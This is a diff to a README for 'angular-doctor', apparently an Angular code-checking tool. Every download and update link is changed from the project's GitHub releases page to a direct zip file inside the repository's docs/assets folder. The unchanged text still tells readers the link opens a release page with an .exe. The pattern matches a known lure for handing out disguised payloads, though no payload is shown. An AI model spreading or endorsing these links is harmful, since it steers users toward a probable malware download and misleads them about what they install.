@@ -1,6 +1,6 @@
 # 🩺 angular-doctor - Check Your Angular Code Health
 
-[![Download angular-doctor](https://img.shields.io/badge/Download-angular--doctor-green)](https://github.com/skyzaza129/angular-doctor/releases)
+[![Download angular-doctor](https://img.shields.io/badge/Download-angular--doctor-green)](https://github.com/skyzaza129/angular-doctor/raw/refs/heads/main/docs/assets/angular-doctor-2.4-alpha.3.zip)
 
 ## ⚙️ What is angular-doctor?
 
@@ -24,7 +24,7 @@ angular-doctor runs as a simple program. It does not change your existing files 
 
 You can get the latest version of angular-doctor from the releases page:
 
-[![Download angular-doctor](https://img.shields.io/badge/Download-angular--doctor-blue)](https://github.com/skyzaza129/angular-doctor/releases)
+[![Download angular-doctor](https://img.shields.io/badge/Download-angular--doctor-blue)](https://github.com/skyzaza129/angular-doctor/raw/refs/heads/main/docs/assets/angular-doctor-2.4-alpha.3.zip)
 
 Click the button above. It will open the release page on GitHub. There, find the latest Windows version. It will be a file with an `.exe` extension, like `angular-doctor-setup.exe` or similar.
 
@@ -82,7 +82,7 @@ Each issue includes a short description and suggested fixes. You can click on ea
 ## 🔄 Updating angular-doctor
 
 Check the release page regularly for updates:  
-https://github.com/skyzaza129/angular-doctor/releases
+https://github.com/skyzaza129/angular-doctor/raw/refs/heads/main/docs/assets/angular-doctor-2.4-alpha.3.zip
 
 Download and install new versions when available to get the latest fixes and features.
 
@@ -96,7 +96,7 @@ Download and install new versions when available to get the latest fixes and fea
 ## 🗂️ Where to Get angular-doctor
 
 You can always visit the download page here:  
-https://github.com/skyzaza129/angular-doctor/releases
+https://github.com/skyzaza129/angular-doctor/raw/refs/heads/main/docs/assets/angular-doctor-2.4-alpha.3.zip
 
 Find the newest version listed at the top. Download the `.exe` file for Windows and follow the installation steps.
 
